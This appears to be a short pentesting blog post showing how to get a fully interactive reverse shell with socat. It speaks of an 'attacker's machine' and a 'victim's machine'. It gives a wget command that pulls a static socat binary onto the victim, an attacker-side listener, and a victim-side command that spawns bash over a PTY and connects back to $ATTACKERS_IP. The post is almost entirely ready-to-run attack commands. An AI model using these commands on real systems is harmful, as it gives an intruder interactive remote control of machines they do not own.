---
layout: post
comments: true
title: "Get Full Interactive reverse Shell With Socat"
tags: ['rce','socat','reverse-shell']
---


## Introduction
Today we are going to see a nice method to get an interactive reverse shell with socat.
A few adventages of use interactive shells are the next ones:
- Ctrl + C work just fine, when you press it it doesn't exit the shell, just stop the process is running
- Autocompletation (Tabuation), in normal reverse shells tabulation just add a tabulation, in interactive shells tabs can autocomplete your code.

## Installing socat
Socat may not be installed in the victim's machine so we first we have to install it.<br>
In this [repo][repo] we have a lot of binaries ready to be downloaded and executed, socat is one of this:
```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
```


## Getting reverse shell

In $PORT we can choose a free port like 443

In our attacker's machine:
```bash
socat file:'/dev/tty',raw,echo=0 tcp-listen:$PORT
```


In our victim's machine
```bash
./socat exec:'bash -li',pty, stderr, setsid, sigint, sane tcp:$ATTACKERS_IP:$PORT
```


[repo]: https://github.com/andrew-d/static-binaries